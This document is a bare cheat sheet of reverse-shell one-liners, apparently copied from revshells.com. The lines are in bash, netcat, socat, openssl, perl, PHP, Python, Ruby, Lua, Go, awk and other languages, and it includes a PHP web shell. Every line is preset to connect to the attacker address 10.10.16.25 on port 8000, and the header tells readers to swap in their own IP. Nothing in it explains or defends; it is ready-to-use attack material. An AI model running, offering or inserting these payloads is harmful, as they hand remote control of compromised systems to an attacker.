# revshell payload list extracted from https://www.revshells.com/  (find and replace 10.10.16.25 with your IP; 8000 with your port; /bin/bash with alternatives like sh or /bin/sh)
```bash
/bin/bash -i >& /dev/tcp/10.10.16.25/8000 0>&1
0<&196;exec 196<>/dev/tcp/10.10.16.25/8000; /bin/bash <&196 >&196 2>&196
exec 5<>/dev/tcp/10.10.16.25/8000;cat <&5 | while read line; do $line 2>&5 >&5; done
/bin/bash -i 5<> /dev/tcp/10.10.16.25/8000 0<&5 1>&5 2>&5
/bin/bash -i 5<> /dev/tcp/10.10.16.25/8000 0<&5 1>&5 2>&5
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.16.25 8000 >/tmp/f
nc 10.10.16.25 8000 -e /bin/bash
busybox nc 10.10.16.25 8000 -e /bin/bash
nc -c /bin/bash 10.10.16.25 8000
ncat 10.10.16.25 8000 -e /bin/bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|ncat -u 10.10.16.25 8000 >/tmp/f
C='curl -Ns telnet://10.10.16.25:8000'; $C </dev/null 2>&1 | /bin/bash 2>&1 | $C >/dev/null
rcat connect -s /bin/bash 10.10.16.25 8000
mkfifo /tmp/s; /bin/bash -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 10.10.16.25:8000 > /tmp/s; rm /tmp/s
perl -e 'use Socket;$i="10.10.16.25";$p=8000;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"10.10.16.25:8000");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
<?php if(isset($_REQUEST["cmd"])){ echo "<pre>"; $cmd = ($_REQUEST["cmd"]); system($cmd); echo "</pre>"; die; }?>
php -r '$sock=fsockopen("10.10.16.25",8000);exec("/bin/bash <&3 >&3 2>&3");'
php -r '$sock=fsockopen("10.10.16.25",8000);shell_exec("/bin/bash <&3 >&3 2>&3");'
php -r '$sock=fsockopen("10.10.16.25",8000);system("/bin/bash <&3 >&3 2>&3");'
php -r '$sock=fsockopen("10.10.16.25",8000);passthru("/bin/bash <&3 >&3 2>&3");'
php -r '$sock=fsockopen("10.10.16.25",8000);`/bin/bash <&3 >&3 2>&3`;'
php -r '$sock=fsockopen("10.10.16.25",8000);popen("/bin/bash <&3 >&3 2>&3", "r");'
php -r '$sock=fsockopen("10.10.16.25",8000);$proc=proc_open("/bin/bash", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
export RHOST="10.10.16.25";export RPORT=8000;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.25",8000));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
export RHOST="10.10.16.25";export RPORT=8000;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'
export RHOST="10.10.16.25";export RPORT=8000;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("10.10.16.25",8000));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")'
ruby -rsocket -e'spawn("sh",[:in,:out,:err]=>TCPSocket.new("10.10.16.25",8000))'
ruby -rsocket -e'exit if fork;c=TCPSocket.new("10.10.16.25","8000");loop{c.gets.chomp!;(exit! if $_=="exit");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts "failed: #{$_}"}'
socat TCP:10.10.16.25:8000 EXEC:/bin/bash
socat TCP:10.10.16.25:8000 EXEC:'/bin/bash',pty,stderr,setsid,sigint,sane
sqlite3 /dev/null '.shell rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.16.25 8000 >/tmp/f'
require('child_process').exec('nc -e /bin/bash 10.10.16.25 8000')
TF=$(mktemp -u);mkfifo $TF && telnet 10.10.16.25 8000 0<$TF | /bin/bash 1>$TF
zsh -c 'zmodload zsh/net/tcp && ztcp 10.10.16.25 8000 && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'
lua -e "require('socket');require('os');t=socket.tcp();t:connect('10.10.16.25','8000');os.execute('/bin/bash -i <&3 >&3 2>&3');"
lua5.1 -e 'local host, port = "10.10.16.25", 8000 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","10.10.16.25:8000");cmd:=exec.Command("/bin/bash");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
echo 'import os' > /tmp/t.v && echo 'fn main() { os.system("nc -e /bin/bash 10.10.16.25 8000 0>&1") }' >> /tmp/t.v && v run /tmp/t.v && rm /tmp/t.v
awk 'BEGIN {s = "/inet/tcp/0/10.10.16.25/8000"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
crystal eval 'require "process";require "socket";c=Socket.tcp(Socket::Family::INET);c.connect("10.10.16.25",8000);loop{m,l=c.receive;p=Process.new(m.rstrip("\n"),output:Process::Redirect::Pipe,shell:true);c<<p.output.gets_to_end}'
```